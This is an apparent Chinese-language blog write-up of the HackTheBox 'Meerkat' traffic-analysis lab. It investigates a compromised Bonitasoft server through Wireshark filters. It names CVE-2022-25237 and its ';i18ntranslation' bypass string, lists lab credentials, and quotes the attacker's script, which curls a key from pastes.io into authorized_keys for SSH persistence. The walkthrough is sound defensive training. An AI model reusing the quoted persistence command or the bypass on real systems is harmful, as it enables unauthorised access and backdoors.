@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="巨魔给的面试题，打开HTB的流量分析大门">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Meerkat">
+<meta property="og:url" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="巨魔给的面试题，打开HTB的流量分析大门">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418110808186.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418110940647.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418111436776.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418111600611.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418111822445.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418195919731.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418200345629.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418200905116.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418201250245.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418202654452.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418203318734.png">
+<meta property="article:published_time" content="2024-04-18T03:02:59.000Z">
+<meta property="article:modified_time" content="2024-09-01T14:39:58.979Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/Meerkat-HackTheBox/image-20240418110808186.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/Meerkat-HackTheBox.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Meerkat | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/Meerkat-HackTheBox.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Meerkat
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-18 11:02:59" itemprop="dateCreated datePublished" datetime="2024-04-18T11:02:59+08:00">2024-04-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-01 22:39:58" itemprop="dateModified" datetime="2024-09-01T22:39:58+08:00">2024-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">流量分析</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/Meerkat-HackTheBox.html" class="post-meta-item leancloud_visitors" data-flag-title="Meerkat" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/Meerkat-HackTheBox.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/Meerkat-HackTheBox.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>巨魔给的面试题，打开HTB的流量分析大门</p>
+<span id="more"></span>
+
+<h1 id="Meerkat"><a href="#Meerkat" class="headerlink" title="Meerkat"></a>Meerkat</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote>
+<p>作为一家快速发展的初创公司，Forela 一直在利用业务管理平台。不幸的是，我们的文档很少，而且我们的管理员也不是最有安全意识的。作为我们新的安全提供商，我们希望您查看我们导出的一些 PCAP 和日志数据，以确认我们是否已（或尚未）受到损害。</p>
+</blockquote>
+<h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>我们相信我们的业务管理平台服务器已受到损害。请确认正在运行的应用程序的名称？</strong></p>
+<p>筛选http请求，然后追踪tcp流发现<code>/bonita/portal/homepage</code></p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418110808186.png"></p>
+<p>很明显是和bonita有关，google搜索引擎得到答案为<code>bonitasoft</code></p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418110940647.png"></p>
+<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>我们认为攻击者可能使用了暴力破解攻击类别的子集 - 所执行的攻击的名称是什么？</strong></p>
+<p>经过查看后续的一些 http 包，可以发现产生了大量失败的登录请求，可以怀疑攻击者正在尝试进行凭据爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Credential Stuffing</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>所利用的漏洞是否分配有 CVE - 如果有，是哪一个？</strong></p>
+<p>查找一下是否有被命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现在第1091个流出现命令执行，往前翻找到黑客上传zip文件进行攻击</p>
+<p>那么肯定是通过此zip文件使得命令执行得到root权限</p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418111436776.png"></p>
+<p>通过搜索引擎可以知道漏洞编号为<code>CVE-2022-25237</code></p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418111600611.png"></p>
+<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p><strong>攻击者利用哪个字符串附加到 API URL 路径来绕过授权过滤器？</strong></p>
+<p>我们往下找，注意到<code>/bonita/API/portal/page/;i18ntranslation</code>路径的请求，并且后面就直接RCE了，说明<code>i18ntranslation</code>字符大概率是绕过waf。</p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418111822445.png"></p>
+<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><p><strong>撞库攻击中使用了多少种用户名和密码组合？</strong></p>
+<p>查看访问<code>/bonita/loginservice</code>总共多少个包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Meerkat-HackTheBox/image-20240418195919731.png"></p>
+<p>但是发现很多个包username和password均为install，这些我们不用算在里面所以排除一下</p>
+<p>（当然也可以url解码username会发现为邮箱格式）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot;</span><br></pre></td></tr></table></figure>
+
+<p>右下角显示59个，因为可能存在重复密码所以要查看下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot; &amp;&amp; http contains &quot;seb.broom%40forela.co.uk&quot;</span><br></pre></td></tr></table></figure>
+
+<p>找到用户名<code>seb.broom%40forela.co.uk</code>存在四次重复密码</p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418200345629.png"></p>
+<p>整理一下<code>59-4+1</code>总共56次碰撞</p>
+<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><strong>哪个用户名和密码组合成功？</strong></p>
+<p>我们查找一下响应包也就是用到<code>ip.src</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http &amp;&amp; ip.src==172.31.6.44</span><br></pre></td></tr></table></figure>
+
+<p>注意到响应为204说明爆破成功，追踪下tcp</p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418200905116.png"></p>
+<p>得到用户名和密码（答案注意url编码）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=seb.broom%40forela.co.uk&amp;password=g0vernm3nt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><p><strong>如果有，攻击者使用了哪个文本共享网站？</strong></p>
+<p>使用网站的话那么请求包中应该有<code>http</code>字符（也可以筛选字符串<code>cmd</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;http&quot; &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p>找到为<code>pastes.io</code></p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418201250245.png"></p>
+<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><p><strong>请提供攻击者用于在我们的主机上获得持久性的公钥的文件名。</strong></p>
+<p>我们已经知道黑客用wget去下载该文件，我们打开kali去下载看看</p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418202654452.png"></p>
+<p>不给连接这就怪了，文件内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys</span><br><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure>
+
+<p>所以文件名为<code>hffgra4unv</code></p>
+<h2 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h2><p><strong>您能否确认攻击者修改的文件以获得持久性？</strong></p>
+<p>通过前一道题可以知道用curl命令将文件写到<code>/home/ubuntu/.ssh/authorized_keys</code></p>
+<p>所以能知道攻击者修改了文件</p>
+<h2 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h2><p><strong>您能确认这种持久性机制的 MITRE 技术 ID 吗？</strong></p>
+<p>搜索引擎搜索<code>MITRE authorized_keys</code> ，成功找到id为<code>T1098.004</code></p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418203318734.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/TwoMillion-HackTheBox.html" rel="prev" title="TwoMillion">
+      <i class="fa fa-chevron-left"></i> TwoMillion
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/Bumblebee-HackTheBox.html" rel="next" title="Bumblebee">
+      Bumblebee <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Meerkat"><span class="nav-number">1.</span> <span class="nav-text">Meerkat</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task1"><span class="nav-number">1.2.</span> <span class="nav-text">Task1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task2"><span class="nav-number">1.3.</span> <span class="nav-text">Task2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task3"><span class="nav-number">1.4.</span> <span class="nav-text">Task3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task4"><span class="nav-number">1.5.</span> <span class="nav-text">Task4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task5"><span class="nav-number">1.6.</span> <span class="nav-text">Task5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task6"><span class="nav-number">1.7.</span> <span class="nav-text">Task6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task7"><span class="nav-number">1.8.</span> <span class="nav-text">Task7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task8"><span class="nav-number">1.9.</span> <span class="nav-text">Task8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task9"><span class="nav-number">1.10.</span> <span class="nav-text">Task9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task10"><span class="nav-number">1.11.</span> <span class="nav-text">Task10</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
